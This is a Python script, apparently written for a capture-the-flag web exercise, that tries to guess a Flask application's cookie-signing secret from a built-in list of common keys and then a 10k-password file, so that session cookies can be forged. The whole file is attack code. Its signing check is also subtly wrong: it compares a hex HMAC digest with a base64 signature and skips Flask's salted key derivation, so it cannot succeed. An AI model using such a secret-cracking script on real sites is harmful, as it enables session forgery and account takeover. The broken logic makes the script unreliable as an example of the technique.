import hashlib
import hmac
import base64
import json
import requests
import itertools

# Flask session to crack
cookie = "eyJ1c2VyX2lkIjoyMH0.alYNMQ.sRKp5KoASpiADPBXFuk65MlbQCE"
parts = cookie.split('.')
payload_b64 = parts[0]
timestamp = parts[1]
target_sig = parts[2]

msg = f"{payload_b64}.{timestamp}".encode()

# Try CTF and Flask-specific secrets
secrets = [
    # Common Flask secrets
    'secret', 'secret_key', 'SECRET', 'SECRET_KEY', 'flask_secret',
    'password', 'changeme', 'default', 'dev', 'development',
    'supersecretkey', 'super_secret', 'my-secret-key',
    'you-will-never-guess', 'itsasecret', 'key', 'app-secret',
    
    # CTF specific
    'ctf', 'flag', 'exam', 'web06', '10006', 'docker',
    'exam-web06', 'examweb06', 'test', 'admin',
    
    # Python specific
    'python', 'flask', 'werkzeug', 'sqlite', 'database',
    
    # Common passwords as base
    'admin', 'admin123', '123456', 'password', 'passwd',
    'root', 'toor', 'qwerty', 'letmein',
    
    # Random-looking but common
    'thisisasecretkey', 'mysecretkey', 'thesecretkey',
    'notsosecret', 'verysecret', 'asecret',
    
    # Chinese
    'mima', 'mimamima', 'adminmima',
]

# Add more generated secrets
generated = []
for prefix in ['', 'my-', 'my_', 'the-', 'the_', 'super-', 'super_']:
    for suffix in ['secret', 'key', 'secret-key', 'secret_key', 'password']:
        generated.append(f'{prefix}{suffix}')

secrets.extend(generated)
secrets = list(set(secrets))

print(f'Testing {len(secrets)} secrets...')
found = False
for i, secret in enumerate(secrets):
    key = secret.encode()
    sig = hmac.new(key, msg, hashlib.sha1).hexdigest()
    if sig == target_sig:
        print(f'FOUND SECRET KEY: {secret}')
        found = True
        break
    if i % 200 == 0:
        print(f'  Tested {i}...')

if not found:
    print('Not found with base list')
    
    # Try with RockYou-style common passwords
    with open('C:/Users/HZR/reasonix渗透助手/config/10k-passwords.txt', 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            secret = line.strip()
            if not secret:
                continue
            sig = hmac.new(secret.encode(), msg, hashlib.sha1).hexdigest()
            if sig == target_sig:
                print(f'FOUND SECRET KEY: {secret}')
                found = True
                break
        if not found:
            print('Not found in 10k passwords')
